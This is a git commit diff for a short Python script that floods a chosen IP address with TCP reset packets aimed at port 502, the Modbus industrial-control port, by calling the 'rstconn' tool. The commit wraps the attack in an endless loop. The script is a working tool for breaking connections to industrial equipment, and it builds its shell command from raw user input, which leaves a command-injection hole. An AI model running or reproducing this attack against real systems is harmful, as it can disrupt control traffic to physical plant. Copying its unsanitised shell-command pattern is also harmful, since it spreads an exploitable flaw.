bfcf061b88d3067176503695e9c90388a2040726
lcyf9102s <56214862+lcyf9102s@users.noreply.github.com>
2022-04-24 11:15:01 +0800

    code update

--- tcp_rst_floods/rst.py
+++ tcp_rst_floods/rst.py
@@ -1,10 +1,14 @@
 import os
 
 def reset():
-    interface = input("interface ? ")
-    ip = input("ip addr ? ")
-    c = input("count ? ")
-    p = os.popen("rstconn -i {iface} --server-ip {ip1} --server-port 502 --packet-count {co}".format(iface=interface, ip1=ip, co=c))
+    while True: 
+        interface = input("interface ? ")
+        ip = input("ip addr ? ")
+        c = input("count ? ")
+        p = os.popen("rstconn -i {iface} --server-ip {ip1} --server-port 502 --packet-count {co}".format(iface=interface, ip1=ip, co=c))
+        out = p.read()
+        p.close()
+        print(out)
     
 try:
     reset()
